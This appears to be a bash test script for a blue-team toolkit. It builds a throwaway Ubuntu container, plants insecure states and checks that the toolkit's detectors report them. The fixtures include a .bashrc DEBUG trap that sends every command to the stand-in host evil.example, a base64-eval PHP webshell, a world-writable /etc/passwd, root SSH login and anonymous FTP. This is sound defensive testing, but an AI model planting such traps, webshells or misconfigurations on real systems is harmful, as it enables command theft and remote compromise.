#!/usr/bin/env bash
# Containerized chaos validation for top-level defensive scripts.
#
# Goal: provide repeatable "no-VM" real-world-ish validation by spinning up
# a disposable Ubuntu container, intentionally introducing bad states, and
# checking that scripts detect them.
#
# Usage:
#   bash tests/test_container_chaos.sh
#   bash tests/test_container_chaos.sh --case scored
#   bash tests/test_container_chaos.sh --case audit
#   bash tests/test_container_chaos.sh --case alias
#   bash tests/test_container_chaos.sh --case webapp
#   bash tests/test_container_chaos.sh --case privesc
#   bash tests/test_container_chaos.sh --case incident
#   bash tests/test_container_chaos.sh --case soceng
#   bash tests/test_container_chaos.sh --case network
#   bash tests/test_container_chaos.sh --case smoke
#   bash tests/test_container_chaos.sh --image ubuntu:24.04

set -euo pipefail

CASE="all"
IMAGE="ubuntu:22.04"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --case)
            CASE="${2:-all}"
            shift 2
            ;;
        --image)
            IMAGE="${2:-ubuntu:22.04}"
            shift 2
            ;;
        -h|--help)
            cat <<'USAGE'
Usage: bash tests/test_container_chaos.sh [options]

Options:
    --case <all|scored|audit|alias|webapp|privesc|incident|soceng|network|smoke>
                                                                         Run a specific scenario (default: all)
  --image <image>                   Ubuntu base image (default: ubuntu:22.04)
  -h, --help                        Show this help
USAGE
            exit 0
            ;;
        *)
            echo "Unknown argument: $1"
            exit 1
            ;;
    esac
done

if ! command -v docker >/dev/null 2>&1; then
    echo "Docker not found. Install Docker or use your existing container host first."
    exit 1
fi

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

echo "[INFO] Container chaos validation"
echo "[INFO] Repo:   $REPO_ROOT"
echo "[INFO] Image:  $IMAGE"
echo "[INFO] Case:   $CASE"

MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*" docker run --rm \
    -e CHAOS_CASE="$CASE" \
    -v "$REPO_ROOT:/repo" \
    "$IMAGE" \
    bash -seu <<'EOS'
export DEBIAN_FRONTEND=noninteractive

apt-get update -qq
apt-get install -y --no-install-recommends \
    bash coreutils findutils grep sed gawk \
    iproute2 net-tools procps cron util-linux \
    openssh-server openssh-client nginx vsftpd curl ca-certificates \
    passwd binutils nmap iputils-ping libcap2-bin \
    mysql-client >/dev/null

chmod +x /repo/pcdc_*.sh || true

PASS=0
FAIL=0

pass() { echo "PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

assert_contains() {
    local desc="$1"
    local pattern="$2"
    local output="$3"
    if echo "$output" | grep -qE "$pattern"; then
        pass "$desc"
    else
        fail "$desc (pattern not found: $pattern)"
    fi
}

assert_file_exists() {
    local desc="$1"
    local fpath="$2"
    if [[ -f "$fpath" ]]; then
        pass "$desc"
    else
        fail "$desc (missing file: $fpath)"
    fi
}

run_with_timeout() {
    local desc="$1"
    local seconds="$2"
    shift 2

    local out rc
    set +e
    out=$(timeout "${seconds}"s "$@" </dev/null 2>&1)
    rc=$?
    set -e

    case "$rc" in
        0|1|124)
            pass "$desc (rc=$rc)"
            ;;
        *)
            fail "$desc (unexpected rc=$rc)"
            echo "$out" | tail -n 20 || true
            ;;
    esac
}

run_scored_case() {
    echo ""
    echo "=== CASE: scored-service validator catches bad service configs ==="

    # Intentionally bad states
    mkdir -p /run/sshd /etc/nginx/conf.d
    if grep -q '^PermitRootLogin' /etc/ssh/sshd_config; then
        sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
    else
        echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
    fi

    if grep -q '^anonymous_enable=' /etc/vsftpd.conf; then
        sed -i 's/^anonymous_enable=.*/anonymous_enable=YES/' /etc/vsftpd.conf
    else
        echo 'anonymous_enable=YES' >> /etc/vsftpd.conf
    fi

    cat > /etc/nginx/conf.d/chaos_autoindex.conf <<'EOF'
server {
  listen 8080;
  root /var/www/html;
  location / {
    autoindex on;
  }
}
EOF

    service ssh start >/dev/null 2>&1 || true
    service nginx start >/dev/null 2>&1 || true
    service vsftpd start >/dev/null 2>&1 || true

    out=$(/repo/pcdc_scored_service_validate.sh sshd nginx vsftpd 2>&1 || true)

    assert_contains "sshd root login warning" 'sshd allows direct root login' "$out"
    assert_contains "nginx autoindex warning" 'nginx autoindex is enabled' "$out"
    assert_contains "vsftpd anonymous warning" 'vsftpd anonymous login is enabled' "$out"
}

run_audit_case() {
    echo ""
    echo "=== CASE: linux audit surfaces rogue account ==="

    useradd -m -s /bin/bash rogueaudit || true
    echo 'rogueaudit:TempPass123!' | chpasswd || true

    out=$(/repo/pcdc_linux_audit.sh 2>&1 || true)

    assert_contains "audit output contains rogue user" 'rogueaudit' "$out"
    assert_contains "audit section banner present" 'SECTION 1: USER & ACCOUNT AUDIT' "$out"
}

run_alias_case() {
    echo ""
    echo "=== CASE: alias detector catches DEBUG trap poisoning ==="

    echo 'trap "curl http://evil.example/?c=$BASH_COMMAND >/dev/null 2>&1" DEBUG' >> /root/.bashrc

    out=$(/repo/pcdc_alias_detector_v2.sh 2>&1 || true)

    assert_contains "alias detector flags dangerous trap" 'DANGEROUS TRAP' "$out"
}

run_webapp_case() {
    echo ""
    echo "=== CASE: webapp audit detects webshell + sensitive file ==="

    mkdir -p /var/www/html
    cat > /var/www/html/chaos_webshell.php <<'EOF'
<?php eval(base64_decode($_POST['cmd'])); ?>
EOF
    echo "DB_PASSWORD=notasecret" > /var/www/html/.env

    out=$(/repo/pcdc_webapp_audit.sh 2>&1 || true)

    assert_contains "webshell pattern alert" 'WEBSHELL PATTERN' "$out"
    assert_contains "sensitive file exposure alert" 'SENSITIVE FILE/DIR IN WEB ROOT' "$out"
}

run_privesc_case() {
    echo ""
    echo "=== CASE: privesc detector catches critical misconfig ==="

    chmod 666 /etc/passwd || true
    out=$(/repo/pcdc_privesc_detector.sh 2>&1 || true)

    assert_contains "world-writable passwd alert" 'CRITICAL FILE IS WORLD-WRITABLE: /etc/passwd' "$out"
}

run_incident_case() {
    echo ""
    echo "=== CASE: incident report script builds output file ==="

    input_payload=$'Chaos Tester\n10.0.0.10\n10.0.0.99\n12:34\nAlert pipeline\nsshd\nUnauthorized login detected\nPassword reset and key rotation\n'
    out=$(printf "%s" "$input_payload" | /repo/pcdc_incident_report.sh 2>&1 || true)

    latest_report=$(ls -1t /var/log/blueTeam/incident_report_*.txt 2>/dev/null | head -1)
    assert_contains "incident script confirms save" 'Report saved:' "$out"
    assert_file_exists "incident report file created" "$latest_report"

    if [[ -n "${latest_report:-}" ]]; then
        report_body=$(cat "$latest_report" 2>/dev/null || true)
        assert_contains "incident report includes reporter" 'Reporter:[[:space:]]+Chaos Tester' "$report_body"
    fi
}

run_soceng_case() {
    echo ""
    echo "=== CASE: social engineering checklist scripted pass path ==="

    # 7 checklist prompts; answer yes to each.
    answers=$'y\ny\ny\ny\ny\ny\ny\n'
    out=$(printf "%s" "$answers" | /repo/pcdc_soceng_defense.sh 2>&1 || true)

    assert_contains "soceng checklist reaches success branch" 'ALL CHECKS PASSED' "$out"
}

run_securityonion_case() {
    echo ""
    echo "=== CASE: Security Onion bridge validates missing config ==="

    out=$(/repo/pcdc_securityonion.sh status 2>&1 || true)
    assert_contains "security onion missing SO_HOST warning" 'SO_HOST not set' "$out"
}

run_recovery_check_case() {
    echo ""
    echo "=== CASE: recovery check handles missing fleet file ==="

    out=$(/repo/pcdc_recovery_check.sh 2>&1 || true)
    assert_contains "recovery check warns about missing hosts file" 'No hosts file found' "$out"
}

run_network_case() {
    echo ""
    echo "=== CASE: network enum scripted minimal flow ==="

    # Prompts consumed by script:
    # 1) subnet, 2) known host entries (blank ends), 3) include host in detailed scan,
    # 4) run credential validation.
    answers=$'127.0.0.1/32\n127.0.0.1\n\ny\nn\n'
    out=$(printf "%s" "$answers" | timeout 120s /repo/pcdc_network_enum.sh 2>&1 || true)

    assert_contains "network enum completion banner" 'ENUMERATION COMPLETE' "$out"
    assert_contains "network enum map output" 'Network map:' "$out"
}

run_smoke_case() {
    echo ""
    echo "=== CASE: best-effort smoke for hard-to-fully-assert scripts ==="

    run_with_timeout "linux monitor starts" 20 bash /repo/pcdc_linux_monitor.sh 5
    run_with_timeout "port monitor v1 starts" 20 bash /repo/pcdc_port_monitor.sh 5
    run_with_timeout "port monitor v2 starts" 20 bash /repo/pcdc_port_monitor_v2.sh 5
    run_with_timeout "runbook status" 20 bash /repo/pcdc_runbook.sh status
    run_with_timeout "linux harden guarded start" 20 bash /repo/pcdc_linux_harden.sh
    run_with_timeout "recovery access guarded start" 20 bash /repo/pcdc_recovery_access.sh
    run_with_timeout "ssh validator guarded start" 20 bash /repo/pcdc_ssh_validator.sh
    run_with_timeout "admin setup guarded start" 30 bash /repo/pcdc_admin_setup.sh
}

case "${CHAOS_CASE:-all}" in
    all)
        run_scored_case
        run_audit_case
        run_alias_case
        run_webapp_case
        run_privesc_case
        run_incident_case
        run_soceng_case
        run_securityonion_case
        run_recovery_check_case
        run_network_case
        run_smoke_case
        ;;
    scored)
        run_scored_case
        ;;
    audit)
        run_audit_case
        ;;
    alias)
        run_alias_case
        ;;
    webapp)
        run_webapp_case
        ;;
    privesc)
        run_privesc_case
        ;;
    incident)
        run_incident_case
        ;;
    soceng)
        run_soceng_case
        ;;
    network)
        run_network_case
        ;;
    smoke)
        run_smoke_case
        ;;
    *)
        echo "Unknown CHAOS_CASE: ${CHAOS_CASE:-}"
        exit 1
        ;;
esac

echo ""
echo "=== container-chaos summary: $PASS passed, $FAIL failed ==="
if [[ "$FAIL" -gt 0 ]]; then
    exit 1
fi
EOS
